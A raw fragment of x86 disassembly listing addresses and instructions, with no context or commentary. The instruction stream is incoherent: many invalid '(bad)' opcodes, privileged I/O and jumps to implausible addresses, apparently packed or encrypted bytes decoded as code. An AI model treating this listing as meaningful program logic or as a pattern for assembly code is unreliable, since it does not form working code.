  401fed:	sub    eax,0x888e2dff
  401ff2:	jo     0x401f9a
  401ff4:	xor    eax,0x4211656f
  401ff9:	clc    
  401ffa:	pusha  
  401ffb:	mov    edi,DWORD PTR [ecx-0x3c]
  401ffe:	xchg   ecx,eax
  401fff:	(bad)  
  402001:	push   edi
  402002:	data16 into 
  402004:	mov    cl,0x17
  402006:	in     al,dx
  402007:	jecxz  0x401fe4
  402009:	shl    BYTE PTR [edx],cl
  40200b:	xchg   ebx,eax
  40200c:	push   esp
  40200d:	scas   eax,DWORD PTR es:[edi]
  40200e:	pop    ecx
  40200f:	pop    ebx
  402010:	push   cs
  402011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402012:	mov    bh,0xd0
  402014:	(bad)  
  402015:	hlt    
  402016:	sbb    eax,0xfebcf5e0
  40201b:	retf   0x6390
  40201e:	inc    esi
  40201f:	sbb    ebx,DWORD PTR [eax]
  402021:	or     dh,BYTE PTR [esi+edx*1-0x80]
  402025:	push   ecx
  402026:	cld    
  402027:	ins    BYTE PTR es:[edi],dx
  402028:	cmc    
  402029:	ja     0x402003
  40202b:	mov    ch,0x97
  40202d:	or     BYTE PTR [esi],al
  40202f:	dec    ebp
  402030:	xor    bh,BYTE PTR [esi-0x5212461e]
  402036:	aas    
  402037:	jo     0x40204f
  402039:	dec    ebx
  40203a:	pop    eax
  40203b:	jge    0x40207b
  40203d:	int    0x9b
  40203f:	ror    BYTE PTR [ecx-0x4b],cl
  402042:	xor    DWORD PTR [edx+0x7e],ebp
  402045:	int    0x2f
  402047:	dec    ebp
  402048:	jnp    0x4020bf
  40204a:	fst    DWORD PTR [eax+0x79]
  40204d:	ret    
  40204e:	(bad)  
  40204f:	dec    esp
  402050:	pop    ds
  402051:	scas   eax,DWORD PTR es:[edi]
  402052:	out    dx,al
  402053:	sbb    ebp,0xffffff91
  402056:	adc    bl,BYTE PTR [esi+edi*1-0x9]
  40205a:	jo     0x402037
  40205c:	mov    DWORD PTR [edi-0x4bae8ece],eax
  402062:	cmp    al,0x48
  402064:	or     BYTE PTR [ebx+0x3a],bl
  402067:	mov    cl,0xb1
  402069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40206a:	adc    BYTE PTR [eax+0x18],cl
  40206d:	jo     0x40202d
  40206f:	mov    bl,0x31
  402071:	dec    ecx
  402072:	or     al,0x5c
  402074:	out    dx,al
  402075:	adc    bl,bh
  402077:	int3   
  402078:	jne    0x402061
  40207a:	mov    ebp,0x8d637f46
  40207f:	div    BYTE PTR [edx]
  402081:	sahf   
  402082:	test   BYTE PTR [esi+0x6e3db25f],cl
  402088:	int3   
  402089:	(bad)  
  40208a:	mov    al,ds:0x505353c1
  40208f:	mov    eax,0x9362d7f4
  402094:	push   edx
  402095:	sbb    esp,DWORD PTR [edx+0x48]
  402098:	in     al,dx
  402099:	jne    0x402068
  40209b:	and    al,0x92
  40209d:	mov    ebp,esi
  40209f:	cwde   
  4020a0:	sub    BYTE PTR ds:0xde8c4e55,dl
  4020a6:	xor    BYTE PTR [esi-0x6f],al
  4020a9:	mov    ecx,0x6eb17f64
  4020ae:	or     al,0xa0
  4020b0:	mov    ebx,DWORD PTR [edx-0x2c]
  4020b3:	jp     0x4020cd
  4020b5:	(bad)  
  4020b6:	mov    bh,0x6f
  4020b8:	xchg   ebp,eax
  4020b9:	cmp    eax,0x22f7e83e
  4020be:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4020c0:	test   esi,edx
  4020c2:	in     al,dx
  4020c3:	and    DWORD PTR [eax],0xffffffb8
  4020c6:	cmp    al,0x6d
  4020c8:	push   0x4d
  4020ca:	jl     0x4020b6
  4020cc:	int3   
  4020cd:	xchg   ebp,eax
  4020ce:	mov    edx,0x6d0cf8d8
  4020d3:	or     ah,BYTE PTR [edx+0x2094ff2e]
  4020d9:	fstp   QWORD PTR [ebx-0x2ee129b9]
  4020df:	push   eax
  4020e0:	dec    ebx
  4020e1:	icebp  
  4020e2:	push   ecx
  4020e3:	outs   dx,DWORD PTR ds:[esi]
  4020e4:	fdivr  DWORD PTR [esi-0x133c201d]
  4020ea:	in     eax,dx
  4020eb:	dec    ecx
  4020ec:	test   eax,0xfb4039f
  4020f1:	mov    ecx,0x812c8c13
  4020f6:	sti    
  4020f7:	dec    edi
  4020f8:	jo     0x402130
  4020fa:	aad    0xcc
  4020fc:	in     al,dx
  4020fd:	popf   
  4020fe:	jecxz  0x402115
  402100:	pop    esi
  402101:	push   esi
  402102:	inc    edi
  402103:	jecxz  0x40213b
  402105:	ror    DWORD PTR [ecx],1
  402107:	outs   dx,DWORD PTR ds:[esi]
  402108:	jecxz  0x40208b
  40210a:	pop    eax
  40210b:	push   ebx
  40210c:	retf   0x29f9
  40210f:	lods   eax,DWORD PTR ds:[esi]
  402110:	mov    ch,0xbb
  402112:	das    
  402113:	dec    edx
  402114:	push   es
  402115:	(bad)  
  402116:	std    
  402117:	jns    0x4020a3
  402119:	mov    edx,0x24709f86
  40211e:	cmp    bh,BYTE PTR [edi]
  402120:	dec    eax
  402121:	xor    ah,cl
  402123:	pushf  
  402124:	push   ebx
  402125:	test   eax,0x32167ce0
  40212a:	pop    esp
  40212b:	rcr    BYTE PTR [esi],cl
  40212d:	jns    0x402176
  40212f:	inc    esp
  402130:	fist   DWORD PTR [eax+ebx*4]
  402133:	push   es
  402134:	add    DWORD PTR [ecx-0x3d11f1e5],ebx
  40213a:	xor    DWORD PTR [edx],esp
  40213c:	jo     0x40210a
  40213e:	xor    edx,eax
  402140:	sahf   
  402141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402142:	jle    0x4021b9
  402144:	fwait
  402145:	or     edx,DWORD PTR [edx+0x68e15bcf]
  40214b:	pop    esp
  40214c:	call   0x990d:0xe374b196
  402153:	and    esi,DWORD PTR [esi+0xb414396]
  402159:	stc    
  40215a:	mov    esi,0x4d2fc795
  40215f:	pop    es
  402160:	in     eax,0x8f
  402162:	int    0x84
  402164:	pop    ebp
  402165:	adc    DWORD PTR [edx],0x36
  402168:	inc    esp
  402169:	sub    dl,dl
  40216b:	adc    eax,0xed47856e
  402170:	push   ebp
  402171:	rol    DWORD PTR [eax+esi*4-0x51],0xf7
  402176:	loope  0x402140
  402178:	lahf   
  402179:	jl     0x4021ac
  40217b:	mov    gs,esp
  40217d:	aam    0xb6
  40217f:	mov    ebp,esi
  402181:	and    BYTE PTR [ebx],bl
  402183:	clc    
  402184:	xor    edx,ebp
  402186:	out    0x77,al
  402188:	add    DWORD PTR [ebx-0x67201d66],esp
  40218e:	into   
  40218f:	adc    BYTE PTR [ebx],ah
  402191:	pushf  
  402192:	bound  edi,QWORD PTR [esi+0xd]
  402195:	adc    DWORD PTR [ebx-0x1],esp
  402198:	jmp    0xbe476a08
  40219d:	popf   
  40219e:	arpl   bp,bp
  4021a0:	push   0x1c
  4021a2:	rol    BYTE PTR [edx-0x5a0338c5],1
  4021a8:	inc    eax
  4021a9:	cmp    edx,DWORD PTR [eax+0xb]
  4021ac:	retf   0xd987
  4021af:	stc    
  4021b0:	test   edi,ebp
  4021b2:	xor    esi,DWORD PTR [esi+eax*2+0x7538aee0]
  4021b9:	dec    edi
  4021ba:	sub    ch,BYTE PTR [eax+0x5016fbe5]
  4021c0:	out    dx,eax
  4021c1:	or     al,0xcf
  4021c3:	mov    ebx,0xbb8c4832
  4021c8:	out    0xd9,eax
  4021ca:	adc    esp,DWORD PTR [eax]
  4021cc:	pop    ebp
  4021cd:	test   al,0x8c
  4021cf:	xor    eax,0xbeed30fc
  4021d4:	push   ecx
  4021d5:	aad    0x68
  4021d7:	adc    DWORD PTR es:[ecx+0x7f],ebp
  4021db:	fist   DWORD PTR [esi]
  4021dd:	mov    bl,0x31
  4021df:	cmp    al,0xa0
  4021e1:	xlat   BYTE PTR ds:[ebx]
  4021e2:	dec    BYTE PTR [ecx-0x4fc64baa]
  4021e8:	cmp    esp,ebx
  4021ea:	aad    0x6f
  4021ec:	and    BYTE PTR [ebp-0x2],dl
  4021ef:	inc    ecx
  4021f0:	out    0xfb,eax
  4021f2:	xchg   ebx,eax
  4021f3:	jg     0x4021dc
  4021f5:	mov    BYTE PTR [edx-0xe],ch
  4021f8:	or     DWORD PTR [esi+0x60],edx
  4021fb:	retf   
  4021fc:	or     esp,esi
  4021fe:	jae    0x4021a9
  402200:	iret   
  402201:	stc    
  402202:	leave  
  402203:	sub    eax,0x49096f64
  402208:	lock in eax,dx
  40220a:	mov    ch,0x1a
  40220c:	jmp    0xacc6da19
  402211:	jle    0x40228b
  402213:	mov    DWORD PTR [esp+ebx*1-0x30],eax
  402217:	xchg   ebp,eax
  402218:	xor    DWORD PTR [esi-0x241fee22],esi
  40221e:	sti    
  40221f:	out    0x7e,eax
  402221:	cmp    eax,0x1b091e9
  402226:	jg     0x402278
  402228:	xchg   esi,eax
  402229:	bnd jg 0x402238
  40222c:	sar    BYTE PTR [eax],cl
  40222e:	mov    al,ds:0x2b252de4
  402233:	ret    0x3c47
  402236:	cmp    al,0xc5
  402238:	fsubr  DWORD PTR [edi-0x75]
  40223b:	inc    ebx
  40223c:	pop    ebp
  40223d:	sahf   
  40223e:	mov    dh,0xca
  402240:	mov    ah,0x87
  402242:	pop    eax
  402243:	rol    edi,cl
  402245:	repnz addr16 push eax
  402248:	mul    ch
  40224a:	loope  0x402209
  40224c:	neg    BYTE PTR [edi-0x71]
  40224f:	pusha  
  402250:	mov    al,ds:0xd262d0fd
  402255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402256:	xchg   esp,eax
  402257:	and    esi,ebp
  402259:	icebp  
  40225a:	int3   
  40225b:	mov    ah,0xfa
  40225d:	mov    WORD PTR [edi+0xcd154bd],?
  402263:	push   eax
  402264:	mov    ch,0x42
  402266:	adc    BYTE PTR [ebx],dl
  402268:	cmc    
  402269:	lods   eax,DWORD PTR ds:[esi]
  40226a:	ins    DWORD PTR es:[edi],dx
  40226b:	loope  0x4022ae
  40226d:	and    BYTE PTR [ecx+eiz*4],al
  402270:	popa   
  402271:	inc    eax
  402272:	(bad)  
  402273:	fisttp DWORD PTR [ebx-0x14cbe08]
  402279:	push   ebp
  40227a:	mov    esp,0x291955a0
  40227f:	adc    BYTE PTR [ebx],0x98
  402282:	call   WORD PTR [ecx+0xe]
  402286:	jae    0x4022fa
  402288:	and    ch,BYTE PTR [eax+0x20cd5fb9]
  40228e:	lahf   
  40228f:	test   BYTE PTR [edx-0x207db90a],al
  402295:	inc    ebx
  402296:	dec    edi
  402297:	push   edx
  402298:	les    eax,FWORD PTR [ecx-0x34]
  40229b:	add    DWORD PTR [edx-0x53cd4e26],esp
  4022a1:	in     eax,0xf9
  4022a3:	sti    
  4022a4:	in     al,0x99
  4022a6:	mov    al,0x57
  4022a8:	sub    DWORD PTR [edx+0x7f],0x5c
  4022ac:	xchg   DWORD PTR [esi+0x64180435],ecx
  4022b2:	dec    ebp
  4022b3:	mov    BYTE PTR [edi-0x5f],al
  4022b6:	into   
  4022b7:	or     edi,eax
  4022b9:	test   BYTE PTR [ecx],bl
  4022bb:	(bad)  
  4022bc:	icebp  
  4022bd:	repz aad 0x2d
  4022c0:	imul   edx,DWORD PTR [esi+edi*8+0x1f31eec],0xffffffc2
  4022c8:	xchg   esi,eax
  4022c9:	int    0x6e
  4022cb:	dec    eax
  4022cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022cd:	push   ecx
  4022ce:	inc    ecx
  4022cf:	les    eax,FWORD PTR [eax-0x2a6dbbe7]
  4022d5:	or     eax,0xc2500a6c
  4022da:	cmc    
  4022db:	mov    ah,0x6e
  4022dd:	retf   0x5eef
  4022e0:	xor    eax,DWORD PTR [esi-0x18]
  4022e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022e4:	ret    0x9820
  4022e7:	xchg   ebx,eax
  4022e8:	pop    eax
  4022e9:	sbb    DWORD PTR [ecx+0x594b0f72],ebx
  4022ef:	adc    BYTE PTR [edi-0x3],bh
  4022f2:	in     eax,0x3b
  4022f4:	loope  0x40228e
  4022f6:	add    ebp,DWORD PTR [eax+0x57653ea6]
  4022fc:	dec    ebp
  4022fd:	in     eax,0xd3
  4022ff:	push   esi
  402300:	dec    eax
  402301:	sub    eax,0x1d331e72
  402306:	mov    al,dh
  402308:	push   ss
  402309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40230a:	test   DWORD PTR [edi+0x4e],ebx
  40230d:	lods   al,BYTE PTR ds:[esi]
  40230e:	imul   BYTE PTR [edi+0x41334170]
  402314:	fst    QWORD PTR [ebp-0x20]
  402317:	in     al,dx
  402318:	int3   
  402319:	push   eax
  40231a:	loop   0x40235f
  40231c:	arpl   WORD PTR [ecx+eiz*4+0x481822f3],sp
  402323:	repnz iret 
  402325:	iret   
  402326:	cmp    esi,DWORD PTR [esi+edi*1-0x25]
  40232a:	cmp    eax,0xa86f0095
  40232f:	ror    DWORD PTR [ebp-0x21],0x31
  402333:	rol    BYTE PTR [eax+ecx*1-0x7c1bc32c],0x9b
  40233b:	mov    ch,0xaf
  40233d:	pop    edi
  40233e:	sub    esp,DWORD PTR [eax]
  402340:	push   cs
  402341:	push   esp
  402342:	jne    0x40231d
  402344:	lock jmp 0x4022e3
  402347:	add    eax,0x44820360
  40234c:	or     DWORD PTR ss:[edi+0x42],eax
  402350:	dec    ecx
  402351:	mov    eax,ds:0x92a53db4
  402356:	and    DWORD PTR [ebx+0x31],0x695535d6
  40235d:	xchg   edi,eax
  40235e:	push   edi
  40235f:	mov    ?,WORD PTR [edx]
  402361:	aaa    
  402362:	push   0x1cc052a5
  402367:	loop   0x4023a2
  402369:	adc    BYTE PTR [ebp+0x6553e82f],0x91
  402370:	jae    0x402323
  402372:	adc    BYTE PTR [esi],ch
  402374:	int3   
  402375:	and    al,0x39
  402377:	add    al,0x45
  402379:	fist   WORD PTR [ebp+0x45]
  40237c:	sahf   
  40237d:	mov    es,WORD PTR [edi-0x1586ebf3]
  402383:	data16 test BYTE PTR [edi+ebp*8],ch
  402387:	rcl    BYTE PTR [edx-0xa1093af],1
  40238d:	aad    0xb2
  40238f:	mov    ecx,0x53d98eca
  402394:	stos   BYTE PTR es:[edi],al
  402395:	(bad)  [ebp+0x17]
  402398:	out    dx,al
  402399:	je     0x4023da
  40239b:	jo     0x4023fd
  40239d:	pop    edi
  40239e:	fild   DWORD PTR [ebx+0x22284b34]
  4023a4:	imul   esp,eax,0x98d6cbe2
  4023aa:	ror    BYTE PTR [edx],cl
  4023ac:	mov    eax,0x96aa2603
  4023b1:	fcmovnb st,st(7)
  4023b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023b4:	pusha  
  4023b5:	jecxz  0x402348
  4023b7:	sub    edi,esp
  4023b9:	enter  0x12de,0x2c
  4023bd:	jae    0x402382
  4023bf:	imul   ebp,DWORD PTR [edi],0xfffffff1
  4023c2:	sbb    eax,0x6af9458
  4023c7:	lock in eax,dx
  4023c9:	pop    esp
  4023ca:	adc    al,BYTE PTR ds:0xfd2eaf00
  4023d0:	dec    esi
  4023d1:	fistp  DWORD PTR [esi-0x6bf7a319]
  4023d7:	out    0xd1,al
  4023d9:	in     al,dx
  4023da:	mov    bl,0xca
  4023dc:	mov    WORD PTR [esi-0x23],ds
  4023df:	fld    QWORD PTR [ebp-0x4c]
  4023e2:	test   esp,0x46ec1245
  4023e8:	dec    edi
  4023e9:	pop    esp
  4023ea:	xor    al,0xb9
  4023ec:	retf   
  4023ed:	retf   
  4023ee:	rcl    DWORD PTR [esi-0x69],cl
  4023f1:	cmp    DWORD PTR [ecx],0xffffff95
  4023f4:	push   ebp
  4023f5:	mov    edi,0x6d9cab8e
  4023fa:	in     eax,dx
  4023fb:	ror    BYTE PTR [ebp-0x34f300ce],0x9a
  402402:	dec    edx
  402403:	ins    BYTE PTR es:[edi],dx
  402404:	xchg   esi,eax
  402405:	lods   eax,DWORD PTR ds:[esi]
  402407:	clc    
  402408:	das    
  402409:	sbb    DWORD PTR [ebp-0x6d48c1da],0x7d4d3566
  402413:	jae    0x402416
  402415:	cdq    
  402416:	fst    DWORD PTR [ebx+0x70]
  402419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40241a:	pop    esi
  40241b:	cmp    dl,cl
  40241d:	pusha  
  40241e:	ret    
  40241f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402420:	loopne 0x402469
  402422:	shr    DWORD PTR [ecx],1
  402424:	mov    DWORD PTR [ebp+ecx*1-0x729f458f],edi
  40242b:	in     al,0x4c
  40242d:	cwde   
  40242e:	mov    cl,0x16
  402430:	arpl   WORD PTR [edi-0x7c26c0a9],ax
  402436:	adc    eax,0x654f97d7
  40243b:	repnz dec ebp
  40243d:	ficom  DWORD PTR ds:0x72223808
  402443:	push   ds
  402444:	ret    0x18d
  402447:	pop    eax
  402448:	(bad)  
  402449:	rol    ch,0x2d
  40244c:	pusha  
  40244d:	inc    edx
  40244e:	cmp    DWORD PTR [ecx+0xf],0x76
  402452:	imul   ebp,DWORD PTR [eax+0x5],0x37
  402456:	fist   WORD PTR [esi+eiz*4-0x6022c026]
  40245d:	pusha  
  40245e:	mov    gs:0xed27797a,al
  402464:	mov    es,WORD PTR [edx+0xa]
  402467:	rcl    BYTE PTR [esi+0x50],0xc3
  40246b:	push   eax
  40246c:	xchg   edx,eax
  40246d:	rcr    DWORD PTR [ecx+0x6c3a968f],1
  402473:	lock js 0x402452
  402476:	or     eax,0x73a8b026
  40247b:	jno    0x4024d0
  40247d:	out    0xd7,al
  40247f:	pop    esi
  402480:	mov    ah,0x97
  402482:	jl     0x4024df
  402484:	jo     0x4024f7
  402486:	les    ebx,FWORD PTR [ebp-0x4ee49ca3]
  40248c:	out    dx,al
  40248d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40248e:	rcr    DWORD PTR [edx+ecx*1-0x137f7ba2],0xda
  402496:	xor    BYTE PTR [esi+0x75f0023d],ah
  40249c:	adc    al,0xd2
  40249e:	ret    0x356b
  4024a1:	cmc    
  4024a2:	jmp    0x1295a72d
  4024a7:	push   es
  4024a8:	int3   
  4024a9:	xor    ebx,DWORD PTR [edx+0x24232da2]
  4024af:	jno    0x40251c
  4024b1:	inc    esp
  4024b2:	nop
  4024b3:	mov    edx,0x1d37e2f5
  4024b8:	daa    
  4024b9:	sbb    BYTE PTR [edi-0x28093324],al
  4024bf:	icebp  
  4024c0:	adc    DWORD PTR [ebx+0x2d903fa7],ecx
  4024c6:	xchg   ebx,eax
  4024c7:	add    bl,BYTE PTR [esi-0x25]
  4024ca:	cwde   
  4024cb:	or     BYTE PTR [ebx],bl
  4024cd:	jo     0x40245d
  4024cf:	int3   
  4024d0:	add    edx,DWORD PTR [edx]
  4024d2:	sahf   
  4024d3:	sub    al,0x8d
  4024d5:	mov    bh,0xe3
  4024d7:	adc    esi,eax
  4024d9:	mov    dh,0x67
  4024db:	shl    eax,cl
  4024dd:	(bad)  
  4024de:	cmp    esp,ebx
  4024e0:	out    dx,eax
  4024e1:	mov    eax,ds:0x57ac4ea2
  4024e6:	popf   
  4024e7:	stos   BYTE PTR es:[edi],al
  4024e8:	sub    eax,0xdcb7b9d6
  4024ed:	addr16 inc edi
  4024ef:	icebp  
  4024f0:	push   ebp
  4024f1:	jl     0x40247c
  4024f3:	das    
  4024f4:	jmp    0x1743b012
  4024f9:	mov    ds:0x981e42f2,al
  4024fe:	jns    0x40251e
  402500:	icebp  
  402501:	push   edx
  402502:	push   edi
  402503:	and    bh,al
  402505:	xor    BYTE PTR [edi],al
  402507:	repz stc 
  402509:	add    DWORD PTR [ecx+0x57],esp
  40250c:	pop    ds
  40250d:	pop    ebp
  40250e:	adc    eax,DWORD PTR [esi-0x72]
  402511:	add    ah,BYTE PTR [edi]
  402513:	jnp    0x40250d
  402515:	push   edi
  402516:	cwde   
  402517:	mov    cl,0xb6
  402519:	popf   
  40251a:	push   ebp
  40251b:	adc    al,BYTE PTR [ecx*1+0x1492c3ed]
  402522:	mov    esp,0xb0ba5909
  402527:	cli    
  402528:	adc    edx,DWORD PTR [edx]
  40252a:	ror    dl,1
  40252c:	add    cl,ch
  40252e:	inc    ebp
  40252f:	mov    ds:0x6a20e62d,eax
  402534:	pop    es
  402535:	popf   
  402536:	inc    esp
  402537:	mov    ecx,fs
  402539:	fidivr DWORD PTR [edi]
  40253b:	push   es
  40253c:	jbe    0x4025b3
  40253e:	xchg   DWORD PTR [esi+0x34],esi
  402541:	mov    bl,0x55
  402543:	push   0x1e
  402545:	xchg   edx,eax
  402546:	mov    esi,DWORD PTR [eax-0x7a]
  402549:	nop
  40254a:	adc    eax,0x165dc0fc
  40254f:	lahf   
  402550:	dec    ebp
  402551:	ss push edx
  402553:	lds    edx,FWORD PTR [ebx+0xec79c4]
  402559:	jbe    0x81638fa1
  40255f:	in     eax,dx
  402560:	ss repnz add al,0x43
  402564:	cs sbb al,0xf
  402567:	fs adc edi,0xaaf434eb
  40256e:	cmc    
  40256f:	out    0xfb,al
  402571:	dec    edx
  402572:	jne    0x402514
  402574:	aad    0x74
  402576:	jmp    0xfa897e73
  40257b:	sbb    BYTE PTR [ecx-0x4a],dl
  40257e:	cli    
  40257f:	pop    ecx
  402580:	ins    BYTE PTR es:[edi],dx
  402581:	(bad)  [ecx+0x236b9d28]
  402587:	cwde   
  402588:	bound  ebx,QWORD PTR [ecx+0x5464fed]
  40258e:	les    eax,FWORD PTR [edx+0x5c721b6b]
  402594:	jl     0x40255d
  402596:	ror    BYTE PTR [ebx-0x4bc40cd2],cl
  40259c:	push   edx
  40259d:	cld    
  40259e:	pop    ebp
  40259f:	inc    eax
  4025a0:	pop    eax
  4025a1:	xchg   ebx,eax
  4025a2:	inc    edx
  4025a3:	mov    eax,0x15cbfcf6
  4025a8:	neg    BYTE PTR [eax]
  4025aa:	in     eax,dx
  4025ab:	lahf   
  4025ac:	or     BYTE PTR [ebx-0xd7ba22d],bh
  4025b2:	lahf   
  4025b3:	mov    edi,0x368ae834
  4025b8:	into   
  4025b9:	or     BYTE PTR [eax-0x559fd25c],ch
  4025bf:	mov    DWORD PTR [edi+0x1be71883],ecx
  4025c5:	out    0x9c,al
  4025c7:	xor    ch,bl
  4025c9:	dec    ebp
  4025ca:	pop    ebx
  4025cb:	enter  0x79eb,0xfa
  4025cf:	sbb    esi,0x29
  4025d2:	gs mov ebp,esp
  4025d5:	dec    esi
  4025d6:	and    al,0xb2
  4025d8:	sub    BYTE PTR [edx-0x6],al
  4025db:	sub    BYTE PTR [ebx-0x6e8900e6],dl
  4025e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025e2:	enter  0x82f5,0x8f
  4025e6:	mov    ds:0x1c865c17,al
  4025eb:	mov    ds:0x8a8fcfed,eax
  4025f0:	cmp    edx,ebx
  4025f2:	lods   eax,DWORD PTR ds:[esi]
  4025f3:	cmp    cl,BYTE PTR [ebx-0x17f3a1ad]
  4025f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025fa:	fwait
  4025fb:	into   
  4025fc:	push   esi
  4025fd:	and    eax,esp
  4025ff:	mov    al,ds:0x72282981
  402604:	or     BYTE PTR [eax],0x9f
  402607:	(bad)  
  402609:	das    
  40260a:	jmp    0x38a062b7
  40260f:	sar    ecx,0x32
  402612:	push   DWORD PTR [eax-0x7233482b]
  402618:	fst    QWORD PTR [ebp+edx*2-0x3f890d43]
  40261f:	and    al,BYTE PTR [eax-0x16]
  402622:	push   ds
  402623:	test   BYTE PTR [edi+ebp*1-0x9],dh
  402627:	retf   
  402628:	fcompp 
  40262a:	push   ds
  40262b:	adc    ah,al
  40262d:	ja     0x402615
  40262f:	and    al,0x8a
  402631:	push   esi
  402632:	call   0xa8f42e3f
  402637:	cmp    ecx,edx
  402639:	cli    
  40263a:	jae    0x4025d2
  40263c:	into   
  40263d:	cld    
  40263e:	push   eax
  40263f:	into   
  402640:	jge    0x40265e
  402642:	sub    esp,edi
  402644:	(bad)  
  402645:	repz mov ch,0x49
  402648:	pop    ds
  402649:	outs   dx,BYTE PTR ds:[esi]
  40264a:	js     0x402634
  40264c:	adc    al,0x63
  40264e:	(bad)  
  40264f:	pop    esp
  402650:	ds and al,0xc
  402653:	(bad)  
  402654:	enter  0x55f5,0x1a
  402658:	iret   
  402659:	fistp  QWORD PTR [esi+0x3f]
  40265c:	cli    
  40265d:	pop    esi
  40265e:	jb     0x4026db
  402660:	ins    DWORD PTR es:[edi],dx
  402661:	test   bl,al
  402663:	psrld  mm4,QWORD PTR [eax+0x6ebf4e33]
  40266a:	call   0x707c7693
  40266f:	es cmp eax,0x388ffb89
  402675:	jae    0x402651
  402677:	and    esi,ebp
  402679:	fdiv   QWORD PTR [eax+0x4d0cd35f]
  40267f:	xchg   ebx,eax
  402680:	loope  0x402610
  402682:	retf   0xf41e
  402685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402686:	push   edi
  402687:	pushf  
  402688:	add    BYTE PTR [esi],ch
  40268a:	outs   dx,DWORD PTR ds:[esi]
  40268b:	push   esi
  40268c:	nop
  40268d:	fsubr  DWORD PTR [edx+edx*1+0x32]
  402691:	or     cl,BYTE PTR [edx-0x18795fbd]
  402697:	mov    al,0x23
  402699:	inc    eax
  40269a:	fbstp  TBYTE PTR [ecx+eiz*2+0x0]
  40269e:	xor    DWORD PTR [ebp+0x3],0x8f6bc33f
  4026a5:	sbb    BYTE PTR [edi+0x73505fd3],cl
  4026ab:	ffreep st(1)
  4026ad:	jge    0x402690
  4026af:	loop   0x402668
  4026b1:	sbb    eax,0x90d42319
  4026b6:	retf   
  4026b7:	es test bl,ch
  4026ba:	xchg   ebp,eax
  4026bb:	mov    esp,0xd421433f
  4026c0:	(bad)  
  4026c1:	in     al,dx
  4026c2:	mov    edx,0xaa71ac9b
  4026c7:	jns    0x402682
  4026c9:	pop    ebx
  4026ca:	(bad)  
  4026cc:	jl     0x402651
  4026ce:	push   es
  4026cf:	test   BYTE PTR ds:0x93446c6b,dh
  4026d5:	mov    eax,0x552447e3
  4026da:	add    BYTE PTR [ecx],dl
  4026dc:	sub    dl,BYTE PTR [edi]
  4026de:	cmp    DWORD PTR [eax+0x27],esi
  4026e1:	loopne 0x40267f
  4026e3:	add    eax,0xcf5f238
  4026e8:	push   ecx
  4026e9:	push   ecx
  4026ea:	dec    ecx
  4026eb:	jp     0x402683
  4026ed:	jge    0x40271e
  4026ef:	pop    es
  4026f0:	mov    dh,0xf5
  4026f2:	sbb    bh,BYTE PTR [eax-0x7e]
  4026f5:	sbb    ecx,eax
  4026f7:	inc    esi
  4026f8:	and    eax,0x7dedfdb7
  4026fd:	inc    edx
  4026fe:	in     eax,dx
  4026ff:	hlt    
  402700:	cs and ah,al
  402703:	outs   dx,BYTE PTR ds:[esi]
  402704:	mov    ds:0x4401dc7d,eax
  402709:	cld    
  40270a:	xor    bh,BYTE PTR [ecx]
  40270c:	outs   dx,DWORD PTR ds:[esi]
  40270d:	jg     0x4026ef
  40270f:	pushf  
  402710:	idiv   DWORD PTR [eax+0x3c74098c]
  402716:	lahf   
  402717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402718:	(bad)  
  402719:	mov    edx,0x8bd6e10
  40271e:	out    dx,al
  40271f:	adc    eax,0x4f9a6408
  402724:	or     BYTE PTR [edx],bh
  402726:	cld    
  402727:	out    dx,al
  402728:	addr16 retf 0x8d89
  40272c:	outs   dx,BYTE PTR ds:[esi]
  40272d:	xchg   edi,eax
  40272e:	arpl   dx,dx
  402730:	test   DWORD PTR [ebx],eax
  402732:	cwde   
  402733:	push   edx
  402734:	push   ss
  402735:	mov    bl,0xf7
  402737:	fild   WORD PTR [esi]
  402739:	test   al,0xee
  40273b:	mov    al,0x7b
  40273d:	into   
  40273e:	jmp    0x8255:0x925328b2
  402745:	fs xchg ebp,eax
  402747:	sub    bh,al
  402749:	add    esp,DWORD PTR [eax-0x3d]
  40274c:	aas    
  40274d:	das    
  40274e:	in     eax,0xad
  402750:	fisttp DWORD PTR [edi]
  402752:	dec    eax
  402753:	mov    edi,0xd02ccace
  402758:	jae    0x4027aa
  40275a:	sub    al,0xd9
  40275c:	daa    
  40275d:	cmp    BYTE PTR [eax+edi*4-0x54],bh
  402761:	add    al,0xe6
  402763:	jne    0x4026ff
  402765:	xchg   esi,eax
  402766:	mov    edx,0xf7aaae32
  40276b:	add    DWORD PTR [ebx-0x6b],edx
  40276e:	add    edi,DWORD PTR [ecx-0x7d037b48]
  402774:	in     al,dx
  402775:	jp     0x40272c
  402777:	cmc    
  402778:	dec    esi
  402779:	and    al,0x15
  40277b:	sahf   
  40277c:	mov    bh,0xd4
  40277e:	jbe    0x402705
  402780:	cdq    
  402781:	inc    ebp
  402782:	icebp  
  402783:	fbstp  TBYTE PTR [eax+ebx*4-0x29]
  402787:	push   edx
  402788:	cmp    al,0x41
  40278a:	cld    
  40278b:	ins    BYTE PTR es:[edi],dx
  40278c:	sbb    al,0x41
  40278e:	addr16 cdq 
  402790:	jmp    0x649c6cf3
  402795:	jge    0x402794
  402797:	xor    eax,0x8e6d1ec6
  40279c:	mov    ebp,0x3fc9b4e1
  4027a1:	(bad)  [ecx+0x5bb6d28a]
  4027a7:	je     0x4027f5
  4027a9:	mov    dh,0x4d
  4027ab:	mov    eax,ds:0x1e0be580
  4027b0:	jp     0x402759
  4027b2:	jne    0x402769
  4027b4:	mov    edx,0xe0a96595
  4027b9:	mov    esi,0x2ca5a2ff
  4027be:	xchg   ebx,eax
  4027bf:	jns    0x4027e5
  4027c1:	(bad)  
